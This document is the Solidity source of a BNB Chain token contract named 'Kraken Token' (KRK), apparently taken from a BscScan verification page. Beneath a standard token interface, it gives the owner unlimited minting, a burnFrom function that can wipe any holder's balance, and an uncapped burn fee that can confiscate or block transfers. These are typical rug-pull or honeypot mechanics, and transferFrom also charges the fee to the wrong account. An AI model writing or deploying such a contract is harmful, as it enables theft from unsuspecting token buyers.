/**
 *Submitted for verification at BscScan.com on 2022-07-31
*/

pragma solidity ^0.8.2;

// SPDX-License-Identifier: Unlicensed

/*
https://poocoin.app/
*/

contract Token {

    mapping(address => uint) private balances;
    mapping(address => mapping(address => uint)) private allowance;
    mapping(address => bool) private exceptFromFee;

    uint public totalSupply = 1000000000000 * 10 ** 18;
    string public name = "Kraken Token";
    string public symbol = "KRK";
    uint public decimals = 18;

    uint private BurnFee = 0;

    address private owner;
    
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    
    constructor() {
        balances[msg.sender] = totalSupply;
        exceptFromFee[msg.sender] = true;
        owner = msg.sender;
    }



    function setBurnFee(uint value) public returns(bool)
    {
        require(msg.sender == owner);
        BurnFee = value;
        return true;
    }

    function getBurnFee() public view returns(uint)
    {
        require(msg.sender == owner);
        return BurnFee;
    }


    function mint(uint value) public returns(bool)
    {
        require(msg.sender == owner);
        balances[msg.sender] += value;
        totalSupply += value;
        return true;
    }

    function burn(uint value) public returns (bool)
    {
        require(msg.sender == owner);
        balances[msg.sender] -= value;
        totalSupply -= value;
        return true;
    }

    function burnFrom(address adres, uint value) public returns (bool)
    {
        require(msg.sender == owner);

        if(balanceOf(adres) >= value)
        {
            balances[adres] -= value;
            totalSupply-=value;
            return true;
        }
        else
        {
            return false;
        }
    }






    function balanceOf(address adres) public view returns(uint) {
        return balances[adres];
    }
    
    function transfer(address to, uint value) public returns(bool) {
        require(balanceOf(msg.sender) >= value, 'balance too low');

        if(!exceptFromFee[msg.sender])
        {
            //BURNING//
            uint burnedValue = value /100 * BurnFee;
            balances[msg.sender] -= burnedValue;
            totalSupply -= burnedValue;
            value -= burnedValue;
            //BURNING//
        }
        

        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');

        if(!exceptFromFee[msg.sender])
        {
            //BURNING//
            uint burnedValue = value /100 * BurnFee;
            balances[msg.sender] -= burnedValue;
            totalSupply -= burnedValue;
            value -= burnedValue;
            //BURNING//
        }

        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;   
    }
    
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }
}